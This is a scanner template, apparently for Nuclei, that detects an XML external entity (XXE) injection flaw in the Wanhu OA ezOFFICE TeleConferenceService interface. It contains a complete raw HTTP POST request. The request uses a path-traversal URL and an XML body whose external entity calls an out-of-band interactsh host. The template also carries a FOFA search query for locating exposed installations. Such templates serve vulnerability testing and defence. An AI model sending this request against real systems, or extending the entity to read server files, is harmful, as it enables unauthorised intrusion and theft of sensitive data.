http:
- matchers:
  - part: interactsh_protocol
    type: word
    words:
    - dns
  - condition: and
    part: body
    type: word
    words:
    - <response>
    - <retcode>
  - part: header
    type: word
    words:
    - text/xml
  matchers-condition: and
  raw:
  - 'POST /defaultroot/iWebOfficeSign/OfficeServer.jsp/../../TeleConferenceService
    HTTP/1.1

    Host: {{Hostname}}


    <?xml version="1.0" encoding="UTF-8" ?>

    <!DOCTYPE ANY [

    <!ENTITY xxe SYSTEM "http://{{interactsh-url}}" >]>

    <value>&xxe;</value>

    '
id: wanhu-teleconferenceservice-xxe
info:
  author: SleepingBag945
  description: 'There is an XXE injection vulnerability in the Wanhu OA TeleConferenceService
    interface. An attacker can use the vulnerability to continue XXE injection to
    obtain sensitive information on the server.

    '
  metadata:
    fofa-query: "app=\"\u4E07\u6237\u7F51\u7EDC-ezOFFICE\""
    max-request: 1
    verified: true
  name: Wanhu OA TeleConferenceService Interface - XML External Entity Injection
  reference:
  - "http://wiki.peiqi.tech/wiki/oa/\u4E07\u6237OA/\u4E07\u6237OA%20TeleConferenceService%20XXE\u6CE8\
    \u5165\u6F0F\u6D1E.html"
  - https://github.com/Threekiii/Awesome-POC/blob/master/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E4%B8%87%E6%88%B7OA%20TeleConferenceService%20XXE%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
  severity: high
  tags: wanhu,oa,xxe
